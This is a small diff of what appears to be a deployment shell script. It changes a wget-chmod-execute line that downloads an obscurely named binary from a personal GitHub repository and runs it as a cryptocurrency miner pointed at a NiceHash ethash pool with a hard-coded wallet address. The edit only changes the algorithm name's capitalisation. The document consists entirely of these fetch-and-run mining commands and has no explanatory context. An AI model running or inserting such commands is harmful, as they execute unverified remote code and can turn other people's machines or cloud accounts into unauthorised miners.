@@ -5,7 +5,7 @@ wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a ye
 
 
 
-wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU --algo ethash --pool stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 --user 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.maaa -p x
+wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU --algo ETHASH --pool stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 --user 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.maaa -p x
 
 
 
